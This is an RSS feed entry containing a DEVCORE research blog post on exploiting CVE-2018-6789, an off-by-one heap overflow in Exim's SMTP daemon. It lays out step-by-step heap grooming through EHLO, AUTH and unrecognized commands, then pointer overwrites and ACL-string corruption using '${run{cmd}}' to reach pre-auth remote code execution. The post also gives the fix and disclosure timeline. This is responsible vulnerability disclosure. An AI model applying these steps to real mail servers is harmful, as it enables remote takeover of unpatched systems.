&lt;p&gt;To estimate the severity of this bug, we developed an exploit targeting SMTP daemon of exim. The exploitation mechanism used to achieve pre-auth remote code execution is described in the following paragraphs. In order to leverage this one byte overflow, it is necessary to trick memory management mechanism. It is highly recommended to have basic knowledge of heap exploitation &lt;a href=&quot;#heap_exp&quot;&gt;[ref]&lt;/a&gt; before reading this section.&lt;/p&gt;

&lt;p&gt;We developed the exploit with:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Debian(stretch)&lt;/strong&gt; and &lt;strong&gt;Ubuntu(zesty)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SMTP daemon of Exim4 package&lt;/strong&gt; installed with apt-get (4.89/4.88)&lt;/li&gt;
  &lt;li&gt;Config enabled (uncommented in default config) &lt;strong&gt;CRAM-MD5 authenticator&lt;/strong&gt; (any other authenticator using base64 also works)&lt;/li&gt;
  &lt;li&gt;Basic SMTP commands (&lt;strong&gt;EHLO, MAIL FROM/RCPT TO&lt;/strong&gt;) and &lt;strong&gt;AUTH&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;memory-allocation&quot;&gt;Memory allocation&lt;/h4&gt;

&lt;p&gt;First, we review the source code and search for useful memory allocation. As we mentioned in the &lt;a href=&quot;&quot;&gt;previous article&lt;/a&gt;, exim uses self-defined functions for dynamic allocation:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;store_extend_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* The */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;store_free_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* value of the */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_get_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/* 2nd arg is   */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_get_perm_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* __FILE__ in  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_malloc_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;cm&quot;&gt;/* every call,  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;store_release_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* so give its  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;store_reset_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* correct type */&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Function &lt;code class=&quot;highlighter-rouge&quot;&gt;store_free()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;store_malloc()&lt;/code&gt; calls &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt; of glibc directly. Glibc takes a slightly bigger (&lt;code class=&quot;highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes) &lt;strong&gt;chunk&lt;/strong&gt; and stores its metadata in the first &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes (x86-64) on every allocation, and then returns the location of &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;. The following illustration describes structure of chunk:&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180306/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Metadata includes size of previous chunk (the one exactly above in memory), size of current block and some flags. The first three bits of &lt;code class=&quot;highlighter-rouge&quot;&gt;size&lt;/code&gt; are used to store flags. In this example, size of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x81&lt;/code&gt; implies current chunk is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x80&lt;/code&gt; bytes and the previous chunk is in use.&lt;br /&gt;
Most of released chunks used in exim are put into a doubly linked list called &lt;strong&gt;unsorted bin&lt;/strong&gt;. Glibc maintains it according to the flags, and merges adjacent released chunks into a bigger chunk to avoid fragmentation. For every allocation request, glibc checks these chunks in an FIFO (first in, first-out) order and reuses the chunks.&lt;/p&gt;

&lt;p&gt;For some performance issues, exim maintains its own linked list structure with &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;store_release()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;store_extend()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180306/2.png&quot; alt=&quot;architecture of storeblock&quot; /&gt;&lt;br /&gt;
The main feature of storeblocks is that every block is at least &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2000&lt;/code&gt; bytes, which becomes a restriction to our exploitation. Note that a storeblock is also the &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt; of a chunk. Therefore, if we look into the memory, it is like:&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180306/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we list functions used to arrange heap data:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;EHLO hostname&lt;br /&gt;
  For each EHLO(or HELO) command, exim stores the pointer of hostname in &lt;code class=&quot;highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;store_free()&lt;/code&gt; old name&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;store_malloc()&lt;/code&gt; for new name&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L1833&quot;&gt;smtp_in.c: 1833 check_helo&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;1839&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Discard any previous helo name */&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1840&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1841&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1842&lt;/span&gt;   &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1843&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;store_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1844&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1845&lt;/span&gt;   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1884&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string_copy_malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1885&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Unrecognized command&lt;br /&gt;
  For every unrecognized command with unprintable characters, exim allocates a buffer to convert it to printable
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; to store error message&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L5725&quot;&gt;smtp_in.c: 5725 smtp_setup_msg&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;5725&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L_smtp_syntax_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;5726&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unrecognized command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;AUTH&lt;br /&gt;
  In most authentication procedure, exim uses base64 encoding to communicate with client. The encode and decode string are stored in a buffer allocated by &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; for strings&lt;/li&gt;
      &lt;li&gt;can contain unprintable characters, NULL bytes&lt;/li&gt;
      &lt;li&gt;not necessarily null terminated&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Reset in EHLO/HELO, MAIL, RCPT&lt;br /&gt;
  When a command is done correctly, &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp_reset()&lt;/code&gt; is called. This function calls &lt;code class=&quot;highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt; to reset block chain to a &lt;strong&gt;reset point&lt;/strong&gt;, which means all storeblocks allocated by &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; after last command are released.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt; to reset point (set at the beginning of function)&lt;/li&gt;
      &lt;li&gt;release blocks added at a time&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L3771&quot;&gt;smtp_in.c: 3771 smtp_setup_msg&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  3771 int
  3772 smtp_setup_msg(void)
  3773 {
  3774 int done = 0;
  3775 BOOL toomany = FALSE;
  3776 BOOL discarded = FALSE;
  3777 BOOL last_was_rej_mail = FALSE;
  3778 BOOL last_was_rcpt = FALSE;
  3779 void *reset_point = store_get(0);
  3780
  3781 DEBUG(D_receive) debug_printf(&quot;smtp_setup_msg entered\n&quot;);
  3782
  3783 /* Reset for start of new message. We allow one RSET not to be counted as a
  3784 nonmail command, for those MTAs that insist on sending it between every
  3785 message. Ditto for EHLO/HELO and for STARTTLS, to allow for going in and out of
  3786 TLS between messages (an Exim client may do this if it has messages queued up
  3787 for the host). Note: we do NOT reset AUTH at this point. */
  3788
  3789 smtp_reset(reset_point);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;exploit-steps&quot;&gt;Exploit steps&lt;/h4&gt;
&lt;p&gt;To leverage this off-by-one, the chunk beneath decoded base64 data should be freed easily and controllable. After several attempts, we found that &lt;code class=&quot;highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt; is a better choice. We arrange the heap layout to leave a freed chunk above &lt;code class=&quot;highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt; for the base64 data.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180306/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Put a huge chunk into unsorted bin&lt;br /&gt;
 First of all, we send a EHLO message with huge hostname to make it allocate and deallocate, leaving a &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6060&lt;/code&gt; length (3 storeblocks long) chunk in unsorted bin.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cut the first storeblock&lt;br /&gt;
 Then we send an unrecognized string to trigger &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; and allocate a storeblock inside the freed chunk.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cut the second storeblock and release the first one&lt;br /&gt;
 We send a EHLO message again to get the second storeblock. The first block is freed sequentially because of the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp_reset&lt;/code&gt; called after EHLO is done.&lt;/p&gt;

    &lt;p&gt;After the heap layout is prepared, we can use the off-by-one to overwrite the original chunk size. We modify &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2021&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x20f1&lt;/code&gt;, which slightly extends the chunk.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180306/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Send base64 data and trigger off-by-one&lt;br /&gt;
 To trigger off-by-one, we start an AUTH command to send base64 data. The overflow byte precisely overwrites the first byte of next chunk and extends the next chunk.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Forge a reasonable chunk size&lt;br /&gt;
 Because the chunk is extended, the start of next chunk of is changed to somewhere inside of the original one. Therefore, we need to make it &lt;strong&gt;seems like&lt;/strong&gt; a normal chunk to pass sanity checks in glibc. We send another base64 string here, because it requires &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt; byte and unprintable character to forge chunk size.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Release the extended chunk&lt;br /&gt;
 To control the content of extended chunk, we need to release the chunk first because we cannot edit it directly. That is, we should send a new EHLO message to release the old host name. However, normal EHLO message calls &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp_reset&lt;/code&gt; after it succeeds, which possibly makes program abort or crash. To avoid this, we send an &lt;strong&gt;invalid&lt;/strong&gt; host name such as &lt;code class=&quot;highlighter-rouge&quot;&gt;a+&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Overwrite the &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;next&lt;/code&gt;&lt;/strong&gt; pointer of overlapped storeblock&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180306/6.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
 After the chunk is released, we can retrieve it with AUTH and overwrite part of overlapped storeblock. Here we use a trick called &lt;strong&gt;partial write&lt;/strong&gt;. With this, we can modify the pointer without breaking &lt;strong&gt;ASLR&lt;/strong&gt; (Address space layout randomization). We partially changed the &lt;code class=&quot;highlighter-rouge&quot;&gt;next&lt;/code&gt; pointer to a storeblock containing ACL (Access Control List) strings. The ACL strings are pointed by a set of global pointers such as:&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_etrn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_expn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_helo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_quit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_rcpt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;These pointers are initialized at the beginning of exim process, set according to the configure. For example, if there is a line &lt;code class=&quot;highlighter-rouge&quot;&gt;acl_smtp_mail = acl_check_mail&lt;/code&gt; in the configure, the pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;acl_smtp_mail&lt;/code&gt; points to the string &lt;code class=&quot;highlighter-rouge&quot;&gt;acl_check_mail&lt;/code&gt;. Whenever MAIL FROM is used, exim performs an ACL check, which expands &lt;code class=&quot;highlighter-rouge&quot;&gt;acl_check_mail&lt;/code&gt; first. While expanding, exim tries to execute commands if it encounters &lt;code class=&quot;highlighter-rouge&quot;&gt;${run{cmd}}&lt;/code&gt;, so we achieve code execution as long as we control the ACL strings. In addition, we do not need to hijack program control flow directly and therefore we can bypass mitigations such as &lt;strong&gt;PIE&lt;/strong&gt; (Position Independent Executables), &lt;strong&gt;NX&lt;/strong&gt; easily.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reset storeblocks and retrieve the ACL storeblock&lt;br /&gt;
 Now the ACL storeblock is in the linked list chain. It will be released once &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp_reset()&lt;/code&gt; is triggered, and then we can retrieve it again by allocating multiple blocks.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Overwrite ACL strings and trigger ACL check&lt;br /&gt;
 Finally, we overwrite the whole block containing ACL strings. Now we send commands such as EHLO, MAIL, RCPT to trigger ACL checks. Once we touch an acl defined in the configure, we achieve remote code execution.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;
&lt;p&gt;Upgrade to 4.90.1 or above&lt;/p&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;5 February, 2018 09:10 Reported to Exim&lt;/li&gt;
  &lt;li&gt;6 February, 2018 23:23 CVE received&lt;/li&gt;
  &lt;li&gt;10 February, 2018 18:00 Patch released&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
&lt;p&gt;Vulnerabilities found by Meh, DEVCORE research team.&lt;br /&gt;
meh [at] devco [dot] re&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;https://exim.org/static/doc/security/CVE-2018-6789.txt&lt;br /&gt;
https://git.exim.org/exim.git/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1&lt;br /&gt;
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6789&lt;br /&gt;
http://www.openwall.com/lists/oss-security/2018/02/07/2&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;heap_exp&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;heap-exploitation-materials-return&quot;&gt;Heap exploitation materials &lt;a href=&quot;#back&quot;&gt;[return]&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://heap-exploitation.dhavalkapil.com/&quot;&gt;Heap Exploitation&lt;/a&gt;: A tutorial of heap exploitation by Dhaval Kapil&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/shellphish/how2heap&quot;&gt;how2heap&lt;/a&gt;: A repo for learning heap exploitation by Shellphish&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400&quot;&gt;Heap exploitation&lt;/a&gt;: (Chinese) A slide introducing basic glibc heap exploitation by Angelboy&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/advanced-heap-exploitaion&quot;&gt;Advanced heap exploitation&lt;/a&gt;: (Chinese) A slide of advanced heap exploitation techniques by Angelboy&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.tw/2014/08/the-poisoned-nul-byte-2014-edition.html&quot;&gt;The poisoned NUL byte&lt;/a&gt;: An article of Null byte off-by-one exploitation by Project Zero&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</link>
                <guid>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en</guid>
                <pubDate>Tue, 06 Mar 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
